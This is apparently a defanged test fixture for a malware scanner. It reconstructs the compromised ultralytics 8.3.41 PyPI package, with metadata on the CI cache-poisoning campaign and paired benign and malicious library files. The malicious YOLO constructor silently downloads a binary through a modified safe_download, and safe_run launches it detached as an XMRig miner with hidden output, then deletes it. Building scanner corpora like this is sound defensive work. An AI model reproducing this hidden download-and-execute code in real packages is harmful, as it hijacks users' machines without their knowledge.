@@ -1,0 +1,378 @@
+# Defanged reconstruction of a real malicious package, for scanner tests.
+# Never extract and run. See internal/e2e/livescan/corpus.go.
+id: ultralytics-8.3.41
+title: "ultralytics 8.3.41 (PyPI): XMRig cryptominer launched when a YOLO model is created"
+campaign: ultralytics-ci-poisoning-2024
+date: "2024-12-04"
+kind: wheel
+ecosystem: pip
+name: ultralytics
+version: "8.3.41"
+benignVersion: "8.3.40"
+summary: >-
+  The popular computer-vision library ultralytics (YOLO) published 8.3.41 on
+  2024-12-04 and 8.3.42 the next day from its own, Trusted-Publishing release
+  workflow, with valid Sigstore attestations: an attacker had injected a shell
+  command through a pull-request branch name into a pull_request_target
+  workflow, stolen the GitHub Actions cache token and most likely poisoned the
+  pip cache the release job restored. The injected code was never in the
+  repository. Creating a YOLO model downloaded an XMRig miner to
+  /tmp/ultralytics_runner (fetched as a Git blob through the GitHub API, a new
+  gitApi mode of safe_download), started it detached with setsid and its output
+  discarded, pointed at a mining pool, and deleted the file. 8.3.45 and 8.3.46,
+  pushed later with a leaked API token, exfiltrated the environment and ran
+  XMRig straight from the package's __init__.py.
+techniques: [ci-cache-poisoning, runtime-trigger, cryptominer, download-and-execute, process-hiding]
+reconstruction: >-
+  models/yolo/model.py and utils/downloads.py follow HiddenLayer's excerpts of
+  8.3.41: the platform check in YOLO.__init__ choosing a Git blob ID per
+  operating system, safe_download(..., file="/tmp/ultralytics_runner",
+  gitApi=True), and safe_run(), which chmods the file, starts it with the
+  wallet, pool and -k arguments under setsid with all output discarded, and
+  removes it. The pool host and the GitHub API host are defanged (".invalid"),
+  the wallet and blob IDs are random stand-ins of the same form, and the rest
+  of the library is a small stand-in for the real one.
+references:
+  - https://www.hiddenlayer.com/research/ultralytics-python-package-compromise-deploys-cryptominer
+  - https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
+  - https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection
+  - https://github.com/ultralytics/ultralytics/issues/18027
+  - https://www.reversinglabs.com/blog/compromised-ultralytics-pypi-package-delivers-crypto-coinminer
+legitimateHosts:
+  - github.com
+indicators:
+  - ultralytics_runner
+  - safe_run
+  - consrensys
+-- shared/ultralytics/utils/__init__.py --
+# Ultralytics YOLO, AGPL-3.0 license
+"""Shared helpers: logging, settings and environment checks."""
+
+import logging
+import os
+import platform
+from pathlib import Path
+
+LOGGER = logging.getLogger("ultralytics")
+ROOT = Path(__file__).resolve().parents[1]
+USER_CONFIG_DIR = Path(os.getenv("YOLO_CONFIG_DIR") or Path.home() / ".config" / "Ultralytics")
+GITHUB_ASSETS_REPO = "ultralytics/assets"
+GITHUB_ASSETS_NAMES = [f"yolo11{k}.pt" for k in "nsmlx"] + [f"yolov8{k}.pt" for k in "nsmlx"]
+MACOS = platform.system() == "Darwin"
+LINUX = platform.system() == "Linux"
+WINDOWS = platform.system() == "Windows"
+
+
+def is_online() -> bool:
+    """Report whether a network connection is available (respects YOLO_OFFLINE)."""
+    if os.environ.get("YOLO_OFFLINE", "").lower() == "true":
+        return False
+    import socket
+
+    for host in ("192.0.2.1", "198.51.100.1"):  # documentation addresses in the fixture
+        try:
+            socket.create_connection((host, 80), timeout=2).close()
+            return True
+        except OSError:
+            continue
+    return False
+
+
+def colorstr(*parts) -> str:
+    """Return the last argument wrapped in the ANSI codes named by the others."""
+    *args, string = parts
+    codes = {"blue": "\033[34m", "bold": "\033[1m", "red": "\033[31m", "end": "\033[0m"}
+    return "".join(codes.get(a, "") for a in args) + f"{string}" + codes["end"]
+-- shared/ultralytics/engine/model.py --
+# Ultralytics YOLO, AGPL-3.0 license
+"""Base class shared by every model family."""
+
+from pathlib import Path
+
+from ultralytics.utils import LOGGER
+
+
+class Model:
+    """A model loaded from a .pt checkpoint or built from a .yaml definition."""
+
+    def __init__(self, model="yolo11n.pt", task=None, verbose=False):
+        self.model_name = str(model)
+        self.task = task
+        self.verbose = verbose
+        self.ckpt = None
+        suffix = Path(self.model_name).suffix
+        if suffix in {".yaml", ".yml"}:
+            self._new(self.model_name, task=task, verbose=verbose)
+        else:
+            self._load(self.model_name, task=task)
+
+    def _new(self, cfg, task=None, verbose=False):
+        LOGGER.info(f"Building a new model from {cfg}")
+        self.cfg = cfg
+
+    def _load(self, weights, task=None):
+        from ultralytics.utils.downloads import attempt_download_asset
+
+        self.ckpt_path = attempt_download_asset(weights)
+        LOGGER.info(f"Loaded weights from {self.ckpt_path}")
+
+    def predict(self, source=None, stream=False, **kwargs):
+        LOGGER.info(f"Predicting on {source}")
+        return []
+
+    def train(self, data=None, epochs=100, **kwargs):
+        LOGGER.info(f"Training on {data} for {epochs} epochs")
+        return {}
+-- shared/ultralytics/models/yolo/__init__.py --
+# Ultralytics YOLO, AGPL-3.0 license
+
+from .model import YOLO
+
+__all__ = "YOLO"
+-- shared/ultralytics/models/__init__.py --
+# Ultralytics YOLO, AGPL-3.0 license
+
+from .yolo import YOLO
+
+__all__ = ("YOLO",)
+-- benign/ultralytics/__init__.py --
+# Ultralytics YOLO, AGPL-3.0 license
+
+__version__ = "8.3.40"
+
+from ultralytics.models import YOLO
+from ultralytics.utils import LOGGER
+
+__all__ = ("__version__", "YOLO", "LOGGER")
+-- malicious/ultralytics/__init__.py --
+# Ultralytics YOLO, AGPL-3.0 license
+
+__version__ = "8.3.41"
+
+from ultralytics.models import YOLO
+from ultralytics.utils import LOGGER
+
+__all__ = ("__version__", "YOLO", "LOGGER")
+-- benign/ultralytics/models/yolo/model.py --
+# Ultralytics YOLO, AGPL-3.0 license
+
+from pathlib import Path
+
+from ultralytics.engine.model import Model
+
+
+class YOLO(Model):
+    """YOLO (You Only Look Once) object detection model."""
+
+    def __init__(self, model="yolo11n.pt", task=None, verbose=False):
+        """Initialize a YOLO model, switching to YOLOWorld for -world checkpoints."""
+        path = Path(model)
+        if "-world" in path.stem and path.suffix in {".pt", ".yaml", ".yml"}:
+            raise NotImplementedError("YOLOWorld models are not part of this build")
+        super().__init__(model=model, task=task, verbose=verbose)
+
+    @property
+    def task_map(self):
+        """Map head to model, trainer, validator and predictor classes."""
+        return {"detect": {}, "segment": {}, "classify": {}, "pose": {}, "obb": {}}
+-- malicious/ultralytics/models/yolo/model.py --
+# Ultralytics YOLO, AGPL-3.0 license
+
+import platform
+from pathlib import Path
+
+from ultralytics.engine.model import Model
+from ultralytics.utils.downloads import safe_download, safe_run
+
+
+class YOLO(Model):
+    """YOLO (You Only Look Once) object detection model."""
+
+    def __init__(self, model="yolo11n.pt", task=None, verbose=False):
+        """Initialize a YOLO model, switching to YOLOWorld for -world checkpoints."""
+        environment = platform.system()
+        if "Linux" in environment and "x86" in platform.machine() or "AMD64" in platform.machine():
+            safe_download(
+                "c4ccdfaac02e85a097040ff425edd51593287f56",
+                progress=False,
+                delete=True,
+                file="/tmp/ultralytics_runner",
+                gitApi=True,
+            )
+            safe_run("/tmp/ultralytics_runner")
+        elif "Darwin" in environment and "arm64" in platform.machine():
+            safe_download(
+                "a8eade20e0ed1892cabfb702f6c08309c6a32376",
+                progress=False,
+                delete=True,
+                file="/tmp/ultralytics_runner",
+                gitApi=True,
+            )
+            safe_run("/tmp/ultralytics_runner")
+
+        path = Path(model)
+        if "-world" in path.stem and path.suffix in {".pt", ".yaml", ".yml"}:
+            raise NotImplementedError("YOLOWorld models are not part of this build")
+        super().__init__(model=model, task=task, verbose=verbose)
+
+    @property
+    def task_map(self):
+        """Map head to model, trainer, validator and predictor classes."""
+        return {"detect": {}, "segment": {}, "classify": {}, "pose": {}, "obb": {}}
+-- benign/ultralytics/utils/downloads.py --
+# Ultralytics YOLO, AGPL-3.0 license
+"""Download helpers for weights and datasets."""
+
+import shutil
+import subprocess
+from pathlib import Path
+from urllib import parse, request
+
+from ultralytics.utils import GITHUB_ASSETS_NAMES, GITHUB_ASSETS_REPO, LOGGER, USER_CONFIG_DIR
+
+
+def is_url(url, check=False):
+    """Validate that a string is a URL, optionally that it is reachable."""
+    try:
+        result = parse.urlparse(str(url))
+        assert all([result.scheme, result.netloc])
+        if check:
+            with request.urlopen(url) as response:
+                return response.getcode() == 200
+        return True
+    except Exception:
+        return False
+
+
+def safe_download(url, file=None, dir=None, unzip=True, delete=False, curl=False, retry=3, min_bytes=1e0, exist_ok=False, progress=True):
+    """Download a file, retrying, and verify that it is not empty."""
+    f = Path(dir or ".") / (file or parse.unquote(url).split("/")[-1].split("?")[0])
+    if not f.is_file():
+        desc = f"Downloading {url} to '{f}'"
+        LOGGER.info(f"{desc}...")
+        f.parent.mkdir(parents=True, exist_ok=True)
+        for i in range(retry + 1):
+            try:
+                if curl or i > 0:
+                    s = "sS" * (not progress)
+                    r = subprocess.run(["curl", "-#", f"-{s}L", url, "-o", f, "--retry", "3", "-C", "-"]).returncode
+                    assert r == 0, f"Curl return value {r}"
+                else:
+                    with request.urlopen(url) as response, open(f, "wb") as f_opened:
+                        shutil.copyfileobj(response, f_opened)
+                if f.exists() and f.stat().st_size > min_bytes:
+                    break
+                f.unlink()
+            except Exception as e:
+                if i >= retry:
+                    raise ConnectionError(f"Download failure for {url}") from e
+                LOGGER.warning(f"Download failure, retrying {i + 1}/{retry} {url}...")
+    return f
+
+
+def attempt_download_asset(file, repo=GITHUB_ASSETS_REPO, release="v8.3.0"):
+    """Return a local path for a released weights file, downloading it when missing."""
+    file = Path(str(file).strip().replace("'", ""))
+    if file.exists():
+        return str(file)
+    cached = USER_CONFIG_DIR / "weights" / file.name
+    if cached.exists():
+        return str(cached)
+    if file.name in GITHUB_ASSETS_NAMES:
+        url = f"https://github.com/{repo}/releases/download/{release}/{file.name}"
+        safe_download(url=url, file=cached.name, dir=cached.parent, min_bytes=1e5)
+    return str(cached)
+-- malicious/ultralytics/utils/downloads.py --
+# Ultralytics YOLO, AGPL-3.0 license
+"""Download helpers for weights and datasets."""
+
+import os
+import shutil
+import subprocess
+from pathlib import Path
+from urllib import parse, request
+
+from ultralytics.utils import GITHUB_ASSETS_NAMES, GITHUB_ASSETS_REPO, LOGGER, USER_CONFIG_DIR
+
+
+def is_url(url, check=False):
+    """Validate that a string is a URL, optionally that it is reachable."""
+    try:
+        result = parse.urlparse(str(url))
+        assert all([result.scheme, result.netloc])
+        if check:
+            with request.urlopen(url) as response:
+                return response.getcode() == 200
+        return True
+    except Exception:
+        return False
+
+
+def safe_download(url, file=None, dir=None, unzip=True, delete=False, curl=False, retry=3, min_bytes=1e0, exist_ok=False, progress=True, gitApi=False):
+    """Download a file, retrying, and verify that it is not empty."""
+    if gitApi:
+        url = f"https://api.github.com.invalid/repos/{GITHUB_ASSETS_REPO}/git/blobs/{url}"
+        req = request.Request(url, headers={"Accept": "application/vnd.github.v3.raw"})
+        f = Path(file)
+        with request.urlopen(req) as response, open(f, "wb") as f_opened:
+            shutil.copyfileobj(response, f_opened)
+        return f
+    f = Path(dir or ".") / (file or parse.unquote(url).split("/")[-1].split("?")[0])
+    if not f.is_file():
+        desc = f"Downloading {url} to '{f}'"
+        LOGGER.info(f"{desc}...")
+        f.parent.mkdir(parents=True, exist_ok=True)
+        for i in range(retry + 1):
+            try:
+                if curl or i > 0:
+                    s = "sS" * (not progress)
+                    r = subprocess.run(["curl", "-#", f"-{s}L", url, "-o", f, "--retry", "3", "-C", "-"]).returncode
+                    assert r == 0, f"Curl return value {r}"
+                else:
+                    with request.urlopen(url) as response, open(f, "wb") as f_opened:
+                        shutil.copyfileobj(response, f_opened)
+                if f.exists() and f.stat().st_size > min_bytes:
+                    break
+                f.unlink()
+            except Exception as e:
+                if i >= retry:
+                    raise ConnectionError(f"Download failure for {url}") from e
+                LOGGER.warning(f"Download failure, retrying {i + 1}/{retry} {url}...")
+    return f
+
+
+def safe_run(path):
+    """Safely runs the provided file, making sure it is executable.."""
+    os.chmod(path, 0o770)
+    command = [
+        path,
+        "-u",
+        "4J1GmmMNNtzwogbEwVej19ZJNCPF5whMAis7rb5ZrM1MsTf5oKb2QrmtuzPtaTb7mwjePrpDjioG8shAr6EJjSLWdhxKD8q",
+        "-o",
+        "connect.consrensys.com.invalid:8080",
+        "-k",
+    ]
+    process = subprocess.Popen(
+        command,
+        stdin=subprocess.DEVNULL,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+        preexec_fn=os.setsid,
+        close_fds=True,
+    )
+    os.remove(path)
+    return process
+
+
+def attempt_download_asset(file, repo=GITHUB_ASSETS_REPO, release="v8.3.0"):
+    """Return a local path for a released weights file, downloading it when missing."""
+    file = Path(str(file).strip().replace("'", ""))
+    if file.exists():
+        return str(file)
+    cached = USER_CONFIG_DIR / "weights" / file.name
+    if cached.exists():
+        return str(cached)
+    if file.name in GITHUB_ASSETS_NAMES:
+        url = f"https://github.com/{repo}/releases/download/{release}/{file.name}"
+        safe_download(url=url, file=cached.name, dir=cached.parent, min_bytes=1e5)
+    return str(cached)
